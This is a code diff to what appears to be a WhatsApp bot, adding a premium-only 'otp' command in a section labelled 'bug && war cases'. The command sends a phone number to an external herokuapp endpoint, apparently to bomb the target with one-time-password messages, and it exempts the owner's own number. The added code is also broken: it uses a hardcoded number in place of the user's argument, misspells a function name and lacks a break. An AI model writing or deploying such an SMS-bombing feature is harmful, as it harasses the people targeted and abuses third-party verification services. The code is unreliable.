@@ -43,6 +43,7 @@ const {translate} = require('@vitalets/google-translate-api')
 const scp2 = require('./lib/scraper2') 
 const pkg = require('imgur')
 const Booru = require('booru')
+const phone = require('phone')
 const { ImgurClient } = pkg
 const client = new ImgurClient({ clientId: "a0113354926015a" })
 const {
@@ -8852,6 +8853,15 @@ break
             //bug && war cases 
 //⚠️do not edit cases otherwise bug not work
 //bug cases 
+case 'otp': {
+if (!isPremium) return replygcxeon(mess.premium)
+if (!args[0]) return relygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 6283890667327`)
+const phoneNumber = '+62 838-9066-7327';
+const formattedNumber = phone(phoneNumber, 'ID').format();
+if (formattedNumber == '083890667327') return replygcxeon("You Can't Spam The Owner")
+axios.get(`https://yanotp-ad6db983dfa4.herokuapp.com/?=${formattedNumber}`)
+}
+
 case 'amountbug': {
 if (!isPremium) return replygcxeon(mess.premium)
 if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
